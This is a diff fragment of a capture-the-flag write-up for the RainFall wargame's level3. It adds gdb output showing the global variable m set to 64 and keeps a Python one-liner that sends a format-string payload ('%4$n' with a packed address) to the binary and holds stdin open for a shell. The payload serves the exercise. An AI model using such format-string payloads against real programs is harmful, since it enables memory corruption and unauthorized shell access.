@@ -93,6 +93,17 @@ AAAA 0x200 41414141
 ```
 
 ```
+=> 0x080484df <+59>:	cmp    $0x40,%eax
+
+(gdb) p $eax
+$3 = 64
+
+(gdb) p m
+$4 = 64
+
+(gdb) x/d 0x804988c
+0x804988c <m>:	64
+
 level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "A" * 60 + "%4$n"' ; cat ) | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
